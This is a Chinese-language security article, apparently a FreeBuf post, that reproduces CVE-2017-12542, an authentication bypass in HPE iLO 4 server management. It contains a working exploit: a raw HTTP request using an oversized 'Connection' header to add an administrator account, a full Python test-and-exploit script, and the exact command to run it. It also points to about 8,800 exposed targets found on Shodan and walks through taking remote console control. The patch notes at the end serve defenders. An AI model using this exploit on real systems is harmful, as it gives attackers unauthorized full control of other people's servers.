***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 简介

 **[CVE-2017-12542](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12542)是一个`CVSS
9.8`的高分漏洞，漏洞利用条件简单，危害较大。近十年来，iLO是几乎所有惠普服务器中都嵌入的服务器管理解决方案。它通过远程管理的方式为系统管理员提供了需要的功能。包括电源管理，远程系统控制台，远程CD/DVD映像安装等。HPE
Integrated Lights-Out 4（iLO 4）中的漏洞可能允许未经身份验证的远程攻击者绕过验证并执行任意代码。**

![1.png](https://image.3001.net/images/20180401/15225765713514.png!small)  

## 简要分析

一般，iLO的登录界面如下图所示：

![2.png](https://image.3001.net/images/20180401/15225765765892.png!small)  

当访问

    
    
    https://127.0.0.1:8443/rest/v1/AccountService/Accounts
    

时，会返回`HTTP/1.1 401 Unauthorized`

![3.png](https://image.3001.net/images/20180401/15225766073443.png!small)  

在HTTP头的`Connection`中添加大于等于`29`个字符后，即可绕过验证（下图为成功获取到目标的iLO登录用户名）：

![4.png](https://image.3001.net/images/20180401/15225766197422.png!small)  

向目标`post`添加用户的数据包，且`Connection`仍然用`29个A`，即可成功添加用户：

    
    
    POST /rest/v1/AccountService/Accounts HTTP/1.1
    Host: 127.0.0.1:8443
    Content-Length: 273
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Content-Type: application/json
    
    {"UserName": "administratar", "Password": "admin@123", "Oem": {"Hp": {"Privileges": {"RemoteConsolePriv": true, "iLOConfigPriv": true, "VirtualMediaPriv": true, "UserConfigPriv": true, "VirtualPowerAndResetPriv": true, "LoginPriv": true}, "LoginName": "administratar"}}}
    

![5.png](https://image.3001.net/images/20180401/15225766397758.png!small)  

添加的用户可登陆成功，且有完整的控制权限：

![6.png](https://image.3001.net/images/20180401/15225766721005.png!small)  

## 复现及利用

在shodan以`HP-iLO-Server`为关键词搜索结果大概有8800个，主要分布在美国、香港、英国等。

![6-1.png](https://image.3001.net/images/20180401/1522576697818.png!small)  

我们可以使用[skelsec的PoC](https://github.com/skelsec/CVE-2017-12542/blob/master/exploit_1.py)对目标进行验证：

    
    
    #!/usr/bin/env python
    
    """
    Exploit trigger was presented @reconbrx 2018
    
    Vulnerability found and documented by synacktiv:
    https://www.synacktiv.com/posts/exploit/rce-vulnerability-in-hp-ilo.html
    
    Original advisory from HP:
    https://support.hpe.com/hpsc/doc/public/display?docId=hpesbhf03769en_us
    
    Other advisories for this CVE:
    https://tools.cisco.com/security/center/viewAlert.x?alertId=54930
    https://securitytracker.com/id/1039222
    http://www.exploit-db.com/exploits/44005
    https://packetstormsecurity.com/files/146303/HPE-iLO4-Add-New-Administrator-User.html
    https://vulndb.cyberriskanalytics.com/164082
    
    IMPORTANT: 
    THIS EXPLOIT IS JUST FOR ONE OUT OF THE THREE VULNERABILITES COVERED BY CVE-2017-12542!!!
    The two other vulns are critical as well, but only triggerable on the host itself.
    
    
    """
    
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    import json
    import urllib3
    
    # All of the HP iLO interfaces run on HTTPS, but most of them are using self-signed SSL cert.
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    exploit_trigger = {'Connection' : 'A'*29}
    accounts_url = 'https://%s/rest/v1/AccountService/Accounts'
    
    
    
    def test(ip):
    
        url = accounts_url % ip
        try:
            response = requests.get(url, headers = exploit_trigger, verify = False)
        except Exception as e:
            return False, 'Could not connect to target %s, Reason: %s' % (ip, str(e))
    
        try:
            data = json.loads(response.text)
        except Exception as e:
            return False, 'Target response not as expected!, Exception data: %s' % (str(e),)
    
        return True, data
    
    def exploit(ip, username, password):
        Oem = {
            'Hp' : {
                'LoginName' : username,
                'Privileges': {
                    'LoginPriv' : True,
                    'RemoteConsolePriv': True,
                    'UserConfigPriv' : True,
                    'VirtualMediaPriv': True,
                    'iLOConfigPriv':True,
                    'VirtualPowerAndResetPriv':True,
                }
            }
        }
        body = {
            'UserName':username,
            'Password':password,
            'Oem':Oem
        }
        url = accounts_url % ip
    
    
    
        try:
            response = requests.post(url, json=body, headers = exploit_trigger, verify = False)
        except Exception as e:
            return False, 'Could not connect to target %s, Reason: %s' % (ip, str(e))
    
        if response.status_code in [requests.codes.ok, requests.codes.created]:
            return True, response.text
        else:
            return False, 'Server returned status code %d, data: %s' % (response.status_code, response.text)
    
    if __name__ == '__main__':
        import argparse
        import sys
        parser = argparse.ArgumentParser(description='CVE-2017-12542 Tester and Exploiter script.')
        parser.add_argument('ip', help='target IP')
        parser.add_argument('-t', action='store_true', default=True, help='Test. Trigger the exploit and list all users')
        parser.add_argument('-e', action='store_true', default=False, help='Exploit. Create a new admin user with the credentials specified in -u and -p')
        parser.add_argument('-u', help='username of the new admin user')
        parser.add_argument('-p', help='password of the new admin user')
    
        args = parser.parse_args()
    
        if args.e:
            if args.u is None or args.p is None:
                print('Username and password must be set for exploiting!')
                sys.exit()
            res, data = exploit(args.ip, args.u, args.p)
            if res:
                print('[+] Successfully added user!')
            else:
                print('[-] Error! %s' % data)
    
        elif args.t:
            res, data = test(args.ip)
            if res:
                print('[+] Target is VULNERABLE!')
                for i in data['Items']:
                    print('[+] Account name: %s Username: %s' % (i['Name'], i['Oem']['Hp']['LoginName']))
            else:
                print('[-] Error! %s' % data)
    

用法如下：

    
    
    python hp_iLO_4_exp-CVE-2017-12542.py -e -u administratar -p admin@123 ip:port
    

即可添加用户名为administratar 密码为admin@123的用户：

![7.png](https://image.3001.net/images/20180401/15225766987457.png!small)  

使用hp的`HP iLO Integrated Remote
Console`可以对目标进行远程链接，下载地址为：<https://support.hpe.com/hpsc/swd/public/detail?swItemId=MTX_4f842ceb31cf48d392e22705a8>有两种方式连接目标：

1、打开`HP iLO Integrated Remote Console`，在弹出的提示窗中填入相应的信息。

![8.png](https://image.3001.net/images/20180401/15225767442015.png!small)

  

2、在主页的`information`->`overview`->点击`Java Web Start`会下载一个`jnlp`文件，打开即可自动连接。

![9.png](https://image.3001.net/images/20180401/15225768211969.png!small)

连接后可获取对目标的完整控制：

![10.png](https://image.3001.net/images/20180401/15225768488950.png!small)  

## 漏洞修复

目前惠普已在更新版本（`2.53
或更高版本`）中修复了该漏洞可通过固件升级的方式修复漏洞，补丁获取链接：固件可以从如下地址下载：<http://www.hpe.com/support/ilo4><https://support.hpe.com/hpsc/doc/public/display?docId=hpesbhf03769en_us>

## 参考链接

> <https://github.com/skelsec/CVE-2017-12542/>
>
> <https://github.com/airbus-seclab/ilo4_toolbox>
>
> <https://www.synacktiv.com/posts/exploit/rce-vulnerability-in-hp-ilo.html>
>
> <https://tools.cisco.com/security/center/viewAlert.x?alertId=54930>
>
> <https://support.hpe.com/hpsc/doc/public/display?docId=hpesbhf03769en_us>

 ***本文作者：5ecurity，转载请注明来自FreeBuf.COM**

